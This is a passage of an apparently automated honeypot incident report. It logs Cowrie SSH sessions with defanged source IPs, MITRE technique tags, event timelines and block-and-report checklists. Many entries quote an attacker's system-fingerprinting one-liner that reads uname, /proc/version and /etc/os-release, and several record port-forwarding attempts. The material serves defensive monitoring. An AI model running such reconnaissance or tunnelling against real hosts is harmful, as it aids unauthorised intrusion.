| `2026-07-22 19:45:42` | `cowrie.log.closed` |
| `2026-07-22 19:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a89274907d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:47 |
| **Last Seen** | 2026-07-22 19:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:47:27` | `cowrie.session.connect` |
| `2026-07-22 19:47:27` | `cowrie.client.version` |
| `2026-07-22 19:47:28` | `cowrie.client.kex` |
| `2026-07-22 19:47:28` | `cowrie.login.success` |
| `2026-07-22 19:47:30` | `cowrie.session.params` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.success` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.command.input` |
| `2026-07-22 19:47:30` | `cowrie.log.closed` |
| `2026-07-22 19:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d64e1d5a395

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:49 |
| **Last Seen** | 2026-07-22 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:49:17` | `cowrie.session.connect` |
| `2026-07-22 19:49:17` | `cowrie.client.version` |
| `2026-07-22 19:49:17` | `cowrie.client.kex` |
| `2026-07-22 19:49:18` | `cowrie.login.success` |
| `2026-07-22 19:49:19` | `cowrie.session.params` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.success` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:19` | `cowrie.command.input` |
| `2026-07-22 19:49:20` | `cowrie.log.closed` |
| `2026-07-22 19:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8009c5f0daec

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 19:50 |
| **Last Seen** | 2026-07-22 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:50:49` | `cowrie.session.connect` |
| `2026-07-22 19:50:49` | `cowrie.client.version` |
| `2026-07-22 19:50:49` | `cowrie.client.kex` |
| `2026-07-22 19:50:49` | `cowrie.login.success` |
| `2026-07-22 19:50:50` | `cowrie.session.params` |
| `2026-07-22 19:50:50` | `cowrie.command.input` |
| `2026-07-22 19:50:50` | `cowrie.log.closed` |
| `2026-07-22 19:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-530eed8c3b10

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:51 |
| **Last Seen** | 2026-07-22 19:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:51:04` | `cowrie.session.connect` |
| `2026-07-22 19:51:05` | `cowrie.client.version` |
| `2026-07-22 19:51:05` | `cowrie.client.kex` |
| `2026-07-22 19:51:05` | `cowrie.login.success` |
| `2026-07-22 19:51:07` | `cowrie.session.params` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.success` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.command.input` |
| `2026-07-22 19:51:07` | `cowrie.log.closed` |
| `2026-07-22 19:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceeb8f03f229

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-07-22 19:51 |
| **Last Seen** | 2026-07-22 19:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:51:59` | `cowrie.session.connect` |
| `2026-07-22 19:51:59` | `cowrie.client.version` |
| `2026-07-22 19:51:59` | `cowrie.client.kex` |
| `2026-07-22 19:52:01` | `cowrie.login.success` |
| `2026-07-22 19:52:01` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d668398bfa6e

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-07-22 19:52 |
| **Last Seen** | 2026-07-22 19:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:52:06` | `cowrie.session.connect` |
| `2026-07-22 19:52:06` | `cowrie.client.version` |
| `2026-07-22 19:52:06` | `cowrie.client.kex` |
| `2026-07-22 19:52:07` | `cowrie.login.success` |
| `2026-07-22 19:52:08` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8764a82707

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:52 |
| **Last Seen** | 2026-07-22 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:52:55` | `cowrie.session.connect` |
| `2026-07-22 19:52:55` | `cowrie.client.version` |
| `2026-07-22 19:52:55` | `cowrie.client.kex` |
| `2026-07-22 19:52:56` | `cowrie.login.success` |
| `2026-07-22 19:52:57` | `cowrie.session.params` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.success` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:57` | `cowrie.command.input` |
| `2026-07-22 19:52:58` | `cowrie.log.closed` |
| `2026-07-22 19:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-435521773a8d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:54 |
| **Last Seen** | 2026-07-22 19:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:54:49` | `cowrie.session.connect` |
| `2026-07-22 19:54:49` | `cowrie.client.version` |
| `2026-07-22 19:54:49` | `cowrie.client.kex` |
| `2026-07-22 19:54:50` | `cowrie.login.success` |
| `2026-07-22 19:54:51` | `cowrie.session.params` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.success` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.command.input` |
| `2026-07-22 19:54:51` | `cowrie.log.closed` |
| `2026-07-22 19:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848bd2c52437

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-22 19:55 |
| **Last Seen** | 2026-07-22 19:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:55:11` | `cowrie.session.connect` |
| `2026-07-22 19:55:12` | `cowrie.client.version` |
| `2026-07-22 19:55:12` | `cowrie.client.kex` |
| `2026-07-22 19:55:14` | `cowrie.login.success` |
| `2026-07-22 19:55:15` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c81e5064a86

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-22 19:55 |
| **Last Seen** | 2026-07-22 19:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:55:23` | `cowrie.session.connect` |
| `2026-07-22 19:55:24` | `cowrie.client.version` |
| `2026-07-22 19:55:24` | `cowrie.client.kex` |
| `2026-07-22 19:55:25` | `cowrie.login.success` |
| `2026-07-22 19:55:26` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68b5a57ffa60

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-07-22 19:55 |
| **Last Seen** | 2026-07-22 19:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:55:24` | `cowrie.session.connect` |
| `2026-07-22 19:55:24` | `cowrie.client.version` |
| `2026-07-22 19:55:24` | `cowrie.client.kex` |
| `2026-07-22 19:55:25` | `cowrie.login.success` |
| `2026-07-22 19:55:25` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8a3a1bec908

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-22 19:55 |
| **Last Seen** | 2026-07-22 19:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:55:31` | `cowrie.session.connect` |
| `2026-07-22 19:55:32` | `cowrie.client.version` |
| `2026-07-22 19:55:32` | `cowrie.client.kex` |
| `2026-07-22 19:55:34` | `cowrie.login.success` |
| `2026-07-22 19:55:35` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a63b51f61d0e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:56 |
| **Last Seen** | 2026-07-22 19:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:56:41` | `cowrie.session.connect` |
| `2026-07-22 19:56:41` | `cowrie.client.version` |
| `2026-07-22 19:56:41` | `cowrie.client.kex` |
| `2026-07-22 19:56:42` | `cowrie.login.success` |
| `2026-07-22 19:56:43` | `cowrie.session.params` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.success` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.command.input` |
| `2026-07-22 19:56:43` | `cowrie.log.closed` |
| `2026-07-22 19:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dfc0c68589b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 19:58 |
| **Last Seen** | 2026-07-22 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:58:09` | `cowrie.session.connect` |
| `2026-07-22 19:58:09` | `cowrie.client.version` |
| `2026-07-22 19:58:09` | `cowrie.client.kex` |
| `2026-07-22 19:58:09` | `cowrie.login.success` |
| `2026-07-22 19:58:10` | `cowrie.session.params` |
| `2026-07-22 19:58:10` | `cowrie.command.input` |
| `2026-07-22 19:58:10` | `cowrie.log.closed` |
| `2026-07-22 19:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14da2d3a40f5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:58 |
| **Last Seen** | 2026-07-22 19:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:58:33` | `cowrie.session.connect` |
| `2026-07-22 19:58:33` | `cowrie.client.version` |
| `2026-07-22 19:58:33` | `cowrie.client.kex` |
| `2026-07-22 19:58:34` | `cowrie.login.success` |
| `2026-07-22 19:58:35` | `cowrie.session.params` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.success` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.command.input` |
| `2026-07-22 19:58:35` | `cowrie.log.closed` |
| `2026-07-22 19:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0c9ebc8c94f

| Field | Detail |
|---|---|
| **Source IP** | `106.112.194[.]160` |
| **First Seen** | 2026-07-22 19:59 |
| **Last Seen** | 2026-07-22 19:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:59:26` | `cowrie.session.connect` |
| `2026-07-22 19:59:27` | `cowrie.client.version` |
| `2026-07-22 19:59:27` | `cowrie.client.kex` |
| `2026-07-22 19:59:30` | `cowrie.login.success` |
| `2026-07-22 19:59:30` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.112.194[.]160` to AbuseIPDB if not already reported
- [ ] Block `106.112.194[.]160` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ef89141e24

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:00 |
| **Last Seen** | 2026-07-22 20:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:00:27` | `cowrie.session.connect` |
| `2026-07-22 20:00:28` | `cowrie.client.version` |
| `2026-07-22 20:00:28` | `cowrie.client.kex` |
| `2026-07-22 20:00:28` | `cowrie.login.success` |
| `2026-07-22 20:00:29` | `cowrie.session.params` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
